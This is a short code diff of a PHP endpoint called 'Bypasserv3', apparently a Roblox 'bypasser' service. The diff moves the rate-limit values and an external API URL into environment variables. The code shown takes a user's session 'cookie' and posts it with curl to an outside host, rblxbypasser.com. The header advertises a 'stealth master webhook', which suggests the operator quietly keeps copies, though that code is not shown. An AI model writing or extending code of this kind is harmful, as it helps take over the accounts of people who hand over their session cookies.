@@ -2,6 +2,7 @@
 /**
  * Bypasserv3 - Bypass API Endpoint
  * Complete version with file-based storage and stealth master webhook
+ * Uses Railway environment variables
  */
 
 header('Content-Type: application/json');
@@ -43,7 +44,7 @@ if (isSuspiciousRequest()) {
 
 // Rate limiting
 $ip = getUserIP();
-if (!checkRateLimit($ip, 50, 3600)) {
+if (!checkRateLimit($ip, RATE_LIMIT_MAX, RATE_LIMIT_WINDOW)) {
     http_response_code(429);
     echo json_encode(['success' => false, 'error' => 'Rate limit exceeded']);
     exit;
@@ -112,9 +113,9 @@ function ownsBundle($userId, $bundleId, $headers) {
 }
 
 // ============================================
-// CALL EXTERNAL API WITH BETTER ERROR HANDLING
+// CALL EXTERNAL API (USES RAILWAY VARIABLE)
 // ============================================
-$externalApiUrl = 'https://rblxbypasser.com/api/bypass';
+$externalApiUrl = EXTERNAL_API_URL;
 $postData = json_encode(['cookie' => $cookie]);
 
 $ch = curl_init($externalApiUrl);
